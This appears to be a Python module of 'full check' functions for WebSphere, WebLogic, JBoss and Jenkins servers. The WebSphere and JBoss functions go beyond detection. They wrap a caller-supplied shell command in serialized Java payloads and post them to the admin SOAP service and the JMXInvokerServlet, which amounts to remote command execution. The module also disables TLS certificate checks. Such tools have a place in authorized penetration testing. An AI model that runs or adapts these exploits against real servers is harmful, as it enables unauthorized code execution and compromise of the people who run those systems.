from __future__ import annotations
from typing import Any, Optional
import socket
import ssl
import base64
import urllib.request as urlreq
from urllib.error import HTTPError, URLError
import httpx

from attacks.payloads import (
    jboss_attack__payload_1,
    jboss_attack__payload_2,
    websphere_attack__payload_1,
    websphere_attack__payload_2,
    websphere_attack__payload_3__BODY,
)


def _create_unverified_ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def full_check_websphere(host: str, port: int, protocol: str, cmd: Optional[str] = "") -> dict[str, Any]:
    url = f"{protocol}://{host}:{port}"
    result: dict[str, Any] = {"service": "WebSphere", "url": url}
    # Detection
    try:
        ctx = _create_unverified_ssl_ctx() if protocol == "https" else None
        data = urlreq.urlopen(url, context=ctx, timeout=8).read()
        if b"rO0AB" in data:
            result["status"] = "Vulnerability"
            return result
    except HTTPError as e:
        if e.code == 500 and b"rO0AB" in e.read():
            result["status"] = "Vulnerability"
            return result
    except (URLError, socket.error, socket.timeout):
        result["status"] = "Connection error"
        return result
    # Exploit attempt
    try:
        # build payload
        cmd_bytes = cmd.encode('ascii', errors='ignore')
        ser = bytes.fromhex(websphere_attack__payload_1) + bytes([len(cmd_bytes)]) + cmd_bytes + bytes.fromhex(websphere_attack__payload_2)
        b64 = base64.b64encode(ser).decode()
        body = websphere_attack__payload_3__BODY(b64)
        headers = {"Content-Type": "text/xml; charset=UTF-8", "SOAPAction": "\"urn:AdminService\""}
        resp = httpx.post(url, content=body.encode('utf-8'), headers=headers, verify=(protocol=="https"), timeout=10)
        if resp.status_code == 200:
            result["status"] = "Vulnerability"
        elif resp.status_code in [403, 404, 500]:
            result["status"] = "Not vulnerability"
        else:
            result["status"] = "Unknown status"
    except httpx.HTTPError:
        result["status"] = "Connection error"
    return result


def full_check_weblogic(host: str, port: int, protocol: str, cmd: Optional[str] = None) -> dict[str, Any]:
    endpoint = f"t3://{host}:{port}"  # weblogic uses t3
    result = {"service": "WebLogic", "url": endpoint}
    try:
        if protocol != "t3":
            result["status"] = "Invalid protocol"
            return result
        with socket.create_connection((host, port), timeout=4) as sock:
            headers = ("t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n" + f"PU:t3://{host}:{port}\n\n").encode()
            sock.sendall(headers)
            data = sock.recv(1024)
        if b"HELO" in data:
            result["status"] = "Vulnerability"
        else:
            result["status"] = "Not vulnerability"
    except (socket.error, socket.timeout):
        result["status"] = "Connection error"
    return result


def full_check_jboss(host: str, port: int, protocol: str, cmd: Optional[str] = "") -> dict[str, Any]:
    url = f"{protocol}://{host}:{port}/invoker/JMXInvokerServlet"
    result = {"service": "JBoss", "url": url}
    # Exploit
    try:
        cmd_bytes = cmd.encode('ascii', errors='ignore')
        ser = bytes.fromhex(jboss_attack__payload_1) + bytes([len(cmd_bytes)]) + cmd_bytes + bytes.fromhex(jboss_attack__payload_2)
        ctx = _create_unverified_ssl_ctx() if protocol == "https" else None
        headers = {"Content-Type": "application/octet-stream"}
        resp = httpx.post(url, content=ser, headers=headers, verify=(protocol=="https"), timeout=10)
        if resp.status_code == 200:
            result["status"] = "Vulnerability"
        elif resp.status_code in [403, 404, 500]:
            result["status"] = "Not vulnerability"
        else:
            result["status"] = "Unknown status"
    except httpx.HTTPError:
        result["status"] = "Connection error"
    return result


def full_check_jenkins(host: str, port: int, protocol: str, cmd: Optional[str] = None) -> dict[str, Any]:
    base_url = f"{protocol}://{host}:{port}/jenkins/"
    result = {"service": "Jenkins", "url": base_url}
    # Discover CLI port
    try:
        info = urlreq.urlopen(base_url, context=_create_unverified_ssl_ctx() if protocol=="https" else None, timeout=8).info()
        cli_port = int(info.get("X-Jenkins-CLI-Port", 0)) or None
    except Exception:
        result["status"] = "Not vulnerability"
        return result
    if cli_port is None:
        result["status"] = "No CLI endpoint"
        return result
    # Handshake
    endpoint = (host, cli_port)
    try:
        with socket.create_connection(endpoint, timeout=5) as sock:
            sock.sendall(b"\x00\x14Protocol:CLI-connect")
            data = sock.recv(1024)
        result["url"] = f"{protocol}://{host}:{port} (CLI:{cli_port})"
        if b"rO0AB" in data:
            result["status"] = "Vulnerability"
        else:
            result["status"] = "Not vulnerability"
    except (socket.error, socket.timeout):
        result["status"] = "Connection error"
    return result

# Export all
__all__ = [
    "full_check_websphere",
    "full_check_weblogic",
    "full_check_jboss",
    "full_check_jenkins",
]
